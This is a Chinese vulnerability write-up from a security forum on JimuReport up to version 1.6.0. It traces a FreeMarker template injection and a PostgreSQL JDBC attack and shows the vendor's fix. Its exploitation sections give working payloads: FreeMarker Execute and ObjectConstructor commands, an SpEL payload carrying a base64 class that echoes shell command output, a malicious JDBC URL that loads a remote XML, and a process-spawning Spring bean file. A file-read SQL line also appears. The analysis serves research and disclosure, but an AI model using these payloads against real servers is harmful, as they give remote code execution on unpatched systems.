

# JimuReport ＜= v1.6.0 漏洞分析 - 先知社区

JimuReport ＜= v1.6.0 漏洞分析

- - -

想着找下近期的漏洞分析分析，看到：[https://avd.aliyun.com/detail?id=AVD-2023-1679496](https://avd.aliyun.com/detail?id=AVD-2023-1679496)

> JimuReport 采用纯 Web 在线技术，支持多种数据源，如 Oracle, MySQL, SQLServer, PostgreSQL 等主流的数据库。2023 年互联网上披露其存在前台 JDBC 代码执行漏洞，攻击者可构造恶意请求造成远程代码执行

影响版本：

-   JimuReport <= v1.6.0

## 环境搭建

下载存在漏洞的版本：[https://github.com/jeecgboot/JimuReport/releases/tag/v1.6.0](https://github.com/jeecgboot/JimuReport/releases/tag/v1.6.0)

新建一个数据库 jimureport，将`jimureport.mysql5.7.create.sql`文件导入数据库

修改配置文件 application.yml，填入数据库账号密码  
[![](assets/1707954497-83ae673c9806c475988202c3aacd7dae.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240203214527-7d1397da-c29a-1.png)  
最后 maven 导入依赖，启动，默认 web 端口为 8085

## queryFieldBySql 模板注入

描述：Freemarker 模板注入导致远程命令执行，远程攻击者可利用该漏洞调用在系统上执行任意命令

### 漏洞分析

存在漏洞的路由为：`/jmreport/queryFieldBySql`，该功能是执行 sql 语句

找到对应的文件：`jimureport-spring-boot-starter-1.6.0.jar!/org/jeecg/modules/jmreport/desreport/a/a.class`  
[![](assets/1707954497-f98efd8f5fb1ff3437ed43ab3b884601.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240203214548-89c15de6-c29a-1.png)

使用黑名单的方式检测参数 sql  
[![](assets/1707954497-eaf775ba26263cb1f18ea29f9babcb9f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240203214556-8e888a3e-c29a-1.png)

这个 waf 非常的鸡肋，举个例子：

```plain
select load_file("/etc/passwd");
```

[![](assets/1707954497-8e47220f90ccf207323baf959b382d11.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240203214609-966a516a-c29a-1.png)

sql 注入不是我们关注的重点，重点是后续的解析  
继续跟进发现调用了`this.reportDbService.parseReportSql`执行 sql 语句  
[![](assets/1707954497-888830cfb0323649e2a7b24b4bbcb2c8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240203214621-9d1deba2-c29a-1.png)

`jimureport-spring-boot-starter-1.6.0.jar!/org/jeecg/modules/jmreport/desreport/service/a/i.class`  
[![](assets/1707954497-edc6d3f4d7e35aff24d43099f77b0b90.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240203214628-a134eb00-c29a-1.png)

`jimureport-spring-boot-starter-1.6.0.jar!/org/jeecg/modules/jmreport/desreport/util/f.class`

[![](assets/1707954497-7516c749e3cb38760c8bfe84f1bb094c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240203214641-a942b052-c29a-1.png)

跟进 a 方法，发现触发漏洞的关键点`FreeMarkerUtils.a`  
[![](assets/1707954497-0b1dbf23de849d0a2b84e237b6e78736.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240203214650-ae5cc9f6-c29a-1.png)

`jimureport-spring-boot-starter-1.6.0.jar!/org/jeecg/modules/jmreport/desreport/render/utils/FreeMarkerUtils.class`

[![](assets/1707954497-3b7a847bc32c701fe184809ec78d477c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240203214658-b3806582-c29a-1.png)

调用`(new Template("template", new StringReader(var0), var2)).process(var1, var3)`进行模板解析，版本为 freemarker-2.3.31

调用栈：

```plain
_eval:62, MethodCall (freemarker.core)
eval:101, Expression (freemarker.core)
calculateInterpolatedStringOrMarkup:100, DollarVariable (freemarker.core)
accept:63, DollarVariable (freemarker.core)
visit:347, Environment (freemarker.core)
visit:353, Environment (freemarker.core)
process:326, Environment (freemarker.core)
process:383, Template (freemarker.template)
a:103, FreeMarkerUtils (org.jeecg.modules.jmreport.desreport.render.utils)
a:1150, f (org.jeecg.modules.jmreport.desreport.util)
a:292, f (org.jeecg.modules.jmreport.desreport.util)
parseReportSql:690, i (org.jeecg.modules.jmreport.desreport.service.a)
c:811, a (org.jeecg.modules.jmreport.desreport.a)
```

### 漏洞利用

[https://github.com/achuna33/Memoryshell-JavaALL](https://github.com/achuna33/Memoryshell-JavaALL)

```plain
${"freemarker.template.utility.Execute"?new()("id")}
<#assign value="freemarker.template.utility.Execute"?new()>${value("whoami")}
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","gnome-calculator").start()}
```

看到`freemarker.template.utility.ObjectConstructor`  
[![](assets/1707954497-b5a5dfc3f8da5ddae4b848b9a8fa110c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240203214712-bb97ae7e-c29a-1.png)

使用反射实例化对象，并且参数可控

实例化`org.springframework.expression.spel.standard.SpelExpressionParser`，通过 SPEL 加载字节码

```plain
${"freemarker.template.utility.ObjectConstructor"?new()("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression("T(org.springframework.cglib.core.ReflectUtils).defineClass('tools.SpringEcho',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADQAugoAMABgCgBhAGIKAGEAYwgAZAoAZQBmCABnBwBoCgAHAGkHAGoKAGsAbAgAbQgAbggAbwgAcAgATwoABwBxCAByCABQBwBzCgBrAHQIAFIIAHUKAHYAdwoAEwB4CAB5CgATAHoIAHsIAHwKABMAfQgAfggAfwgAgAgAgQoACQCCCACDBwCECgCFAIYKAIUAhwoAiACJCgAkAIoIAIsKACQAjAoAJACNCACOCACPBwCQBwCRBwCSAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABJMdG9vbHMvU3ByaW5nRWNobzsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAkwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFjAQARTGphdmEvbGFuZy9DbGFzczsBAAFtAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAFvAQASTGphdmEvbGFuZy9PYmplY3Q7AQACbTEBAARyZXNwAQADcmVxAQAJZ2V0V3JpdGVyAQAJZ2V0SGVhZGVyAQAGd3JpdGVyAQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQAIY29tbWFuZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQALY2hhcnNldE5hbWUBAA1TdGFja01hcFRhYmxlBwBoBwCUBwBqBwBzBwBVBwCQAQAKU291cmNlRmlsZQEAD1NwcmluZ0VjaG8uamF2YQwAMQAyBwCVDACWAJcMAJgAmQEAPG9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQucmVxdWVzdC5SZXF1ZXN0Q29udGV4dEhvbGRlcgcAmgwAmwCcAQAUZ2V0UmVxdWVzdEF0dHJpYnV0ZXMBAA9qYXZhL2xhbmcvQ2xhc3MMAJ0AngEAEGphdmEvbGFuZy9PYmplY3QHAJQMAJ8AoAEAQG9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQucmVxdWVzdC5TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMBAAtnZXRSZXNwb25zZQEACmdldFJlcXVlc3QBAB1qYXZheC5zZXJ2bGV0LlNlcnZsZXRSZXNwb25zZQwAoQCeAQAlamF2YXguc2VydmxldC5odHRwLkh0dHBTZXJ2bGV0UmVxdWVzdAEAEGphdmEvbGFuZy9TdHJpbmcMAKIAowEAB29zLm5hbWUHAKQMAKUApgwApwCoAQAGd2luZG93DACpAKoBAANHQksBAAVVVEYtOAwAqwCoAQADV0lOAQACL2MBAAcvYmluL3NoAQACLWMMAKwArQEAB3ByaW50bG4BABFqYXZhL3V0aWwvU2Nhbm5lcgcArgwArwCwDACxALIHALMMALQAtQwAMQC2AQACXEEMALcAuAwAuQCoAQAFZmx1c2gBAAVjbG9zZQEAE2phdmEvbGFuZy9FeGNlcHRpb24BABB0b29scy9TcHJpbmdFY2hvAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABFnZXREZWNsYXJlZE1ldGhvZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAAt0b1VwcGVyQ2FzZQEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAqKExqYXZhL2lvL0lucHV0U3RyZWFtO0xqYXZhL2xhbmcvU3RyaW5nOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAAhAC8AMAAAAAAABAABADEAMgABADMAAAAvAAEAAQAAAAUqtwABsQAAAAIANAAAAAYAAQAAAAcANQAAAAwAAQAAAAUANgA3AAAAAQA4ADkAAgAzAAAAPwAAAAMAAAABsQAAAAIANAAAAAYAAQAAACoANQAAACAAAwAAAAEANgA3AAAAAAABADoAOwABAAAAAQA8AD0AAgA+AAAABAABAD8AAQA4AEAAAgAzAAAASQAAAAQAAAABsQAAAAIANAAAAAYAAQAAAC4ANQAAACoABAAAAAEANgA3AAAAAAABADoAOwABAAAAAQBBAEIAAgAAAAEAQwBEAAMAPgAAAAQAAQA/AAgARQAyAAEAMwAAAscACQAMAAABebgAArYAAxIEtgAFSyoSBgO9AAe2AAhMKwEDvQAJtgAKTbgAArYAAxILtgAFSyoSDAO9AAe2AAhMKhINA70AB7YACE4rLAO9AAm2AAo6BC0sA70ACbYACjoFuAACtgADEg62AAUSDwO9AAe2ABA6BrgAArYAAxIRtgAFEhIEvQAHWQMSE1O2ABA6BxkHBLYAFBkGBLYAFBkGGQQDvQAJtgAKOggZBxkFBL0ACVkDEhVTtgAKwAATOgkGvQATOgoSFrgAF7YAGBIZtgAamQAIEhunAAUSHDoLEha4ABe2AB0SHrYAGpkAEhkKAxIVUxkKBBIfU6cADxkKAxIgUxkKBBIhUxkKBRkJUxkItgAiEiMEvQAHWQMSE1O2ABAZCAS9AAlZA7sAJFm4ACUZCrYAJrYAJxkLtwAoEim2ACq2ACtTtgAKVxkItgAiEiwDvQAHtgAQGQgDvQAJtgAKVxkItgAiEi0DvQAHtgAQGQgDvQAJtgAKV6cABEuxAAEAAAF0AXcALgADADQAAABuABsAAAAKAAwACwAXAAwAIQANAC0ADgA4AA8AQwAQAE4AEQBZABIAbwATAIoAFACQABUAlgAWAKMAFwC4ABgAvgAZANcAGgDnABsA7QAcAPYAHgD8AB8BAgAhAQgAIgFEACMBXAAkAXQAJQF4ACYANQAAAHoADAAMAWgARgBHAAAAFwFdAEgASQABACEBUwBKAEsAAgBDATEATABJAAMATgEmAE0ASwAEAFkBGwBOAEsABQBvAQUATwBJAAYAigDqAFAASQAHAKMA0QBRAEsACAC4ALwAUgBTAAkAvgC2AFQAVQAKANcAnQBWAFMACwBXAAAAQAAG/wDTAAsHAFgHAFkHAFoHAFkHAFoHAFoHAFkHAFkHAFoHAFsHAFwAAEEHAFv8ACAHAFsL/wB0AAAAAQcAXQAAAQBeAAAAAgBf'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader()))").getValue()}
```

[![](assets/1707954497-0f77b67eb6b0cdde7420f24aa6c08dec.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240203214723-c2616056-c29a-1.png)

### 漏洞修复

对比 jimureport-spring-boot-starter-1.6.0 与 jar-jimureport-spring-boot-starter-1.6.1.jar

[![](assets/1707954497-9f7fbf56c43efdeea2d0071f83675b22.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240203214731-c717781a-c29a-1.png)

设置了`var2.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);`

[![](assets/1707954497-d15d7dafb7266e9a946761cc4440672f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240203214739-cbf19708-c29a-1.png)

不能解析下列类：

```plain
freemarker.template.utility.JythonRuntime
freemarker.template.utility.Execute
freemarker.template.utility.ObjectConstructor
```

参考：  
[Java 安全之 freemarker 模板注入](https://www.cnblogs.com/nice0e3/p/16217471.html)

## testConnection JDBC 代码执行

### 漏洞分析

存在漏洞的路由为：`/jmreport/testConnection`，该功能是测试数据源

同样是在`jimureport-spring-boot-starter-1.6.0.jar!/org/jeecg/modules/jmreport/desreport/a/a.class`

[![](assets/1707954497-e4358375d0869516cb109566c94546c6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240203214751-d33f8cb8-c29a-1.png)

这里对 dbUrl 进行处理，跟进`jimureport-spring-boot-starter-1.6.0.jar!/org/jeecg/modules/jmreport/dyndb/util/b.class`

[![](assets/1707954497-5236912802343322b187d288b6401f81.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240203214759-d79c6da8-c29a-1.png)

将 allowLoadLocalInfile 设置为 false，最后调用`DriverManager.getConnection`对数据库进行连接

### 漏洞利用

看到 pom.xml：

```plain
<!-- DB 驱动 -->
<mysql-connector-java.version>8.0.27</mysql-connector-java.version>

<!-- ============================数据库驱动========================== -->
<!--mysql-->
<dependency>
    <groupId>mysql</groupId>
    <artifactId>mysql-connector-java</artifactId>
    <version>${mysql-connector-java.version}</version>
    <scope>runtime</scope>
</dependency>
<!-- oracle 驱动-->
<dependency>
    <groupId>com.oracle</groupId>
    <artifactId>ojdbc6</artifactId>
    <version>11.2.0.3</version>
    <scope>runtime</scope>
</dependency>
<!--  sqlserver-->
<dependency>
   <groupId>com.microsoft.sqlserver</groupId>
   <artifactId>sqljdbc4</artifactId>
   <version>4.0</version>
   <scope>runtime</scope>
</dependency>
<!-- postgresql 驱动-->
<dependency>
    <groupId>org.postgresql</groupId>
    <artifactId>postgresql</artifactId>
    <version>42.2.6</version>
    <scope>runtime</scope>
</dependency>
<!-- ===需要什么数据库，手工打开注释=== -->
<!-- 达梦驱动-->
<dependency>
    <groupId>com.dameng</groupId>
    <artifactId>DmJdbcDriver18</artifactId>
    <version>1.0</version>
    <scope>runtime</scope>
</dependency>
<dependency>
    <groupId>com.dameng</groupId>
    <artifactId>DmDialectForHibernate</artifactId>
    <version>5.3</version>
    <scope>runtime</scope>
</dependency>
<!-- sqlite-->
<dependency>
    <groupId>org.xerial</groupId>
    <artifactId>sqlite-jdbc</artifactId>
    <version>3.34.0</version>
    <scope>runtime</scope>
</dependency>
<!--hsqldb-->
<dependency>
    <groupId>org.hsqldb</groupId>
    <artifactId>hsqldb</artifactId>
    <version>2.2.8</version>
    <scope>runtime</scope>
</dependency>
<!--h2-->
<dependency>
    <groupId>com.h2database</groupId>
    <artifactId>h2</artifactId>
    <version>1.4.197</version>
    <scope>runtime</scope>
</dependency>
<!--derby-->
<dependency>
    <groupId>org.apache.derby</groupId>
    <artifactId>derbyclient</artifactId>
    <version>10.11.1.1</version>
    <scope>runtime</scope>
</dependency>
<!--db2-->
<dependency>
    <groupId>com.ibm.db2</groupId>
    <artifactId>jcc</artifactId>
    <version>11.5.0.0</version>
    <scope>runtime</scope>
</dependency>
<!--神通-->
<dependency>
    <groupId>com.csicit.thirdparty</groupId>
    <artifactId>oscar</artifactId>
    <version>1.0.1</version>
    <scope>runtime</scope>
</dependency>
<!--人大金仓-->
<dependency>
    <groupId>kingbase</groupId>
    <artifactId>kingbase8</artifactId>
    <version>8</version>
    <scope>runtime</scope>
</dependency>
<!-- ============================数据库驱动========================== -->
```

#### CVE-2022-21724

在 REL9.4.1208 <=postgresql <42.2.25 内存在 JDBC Attack

-   org.springframework.context.support.ClassPathXmlApplicationContext
-   org.springframework.context.support.FileSystemXmlApplicationContext

通过加载远程恶意 XML 实现 RCE

```plain
jdbc:postgresql://127.0.0.1:5432/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://target/exp.xml
```

恶意 poc.xml：

```plain
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
   <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>cmd.exe</value>
            <value>/c</value>
            <value>calc.exe</value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

后续还有很多可利用的依赖，就不多分析了
